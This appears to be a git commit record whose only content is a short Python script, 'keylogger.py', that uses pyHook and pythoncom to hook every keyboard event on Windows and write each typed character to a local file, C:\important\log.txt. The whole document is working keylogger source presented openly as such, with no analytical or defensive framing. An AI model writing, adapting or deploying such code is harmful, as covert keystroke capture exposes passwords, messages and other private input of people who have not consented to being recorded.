43f88115c9fe81be0fe9001d84b659e06e454b5c
Sohaib76 <6sohaib@gmail.com>
2019-02-20 14:07:36 -0800

    First Commit

---
+++ Key  Logger/keylogger.py
@@ -0,0 +1,17 @@
+import pyHook
+import pythoncom
+import sys
+import logging
+
+file_log = 'C:\\important\\log.txt'
+
+def OnKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+
+hook_manager = pyHook.HookManager()
+hook_manager.keyDown = OnKeyboardEvent
+hook_manager.HookKeyboard()
+pythoncom.PumpMessages()
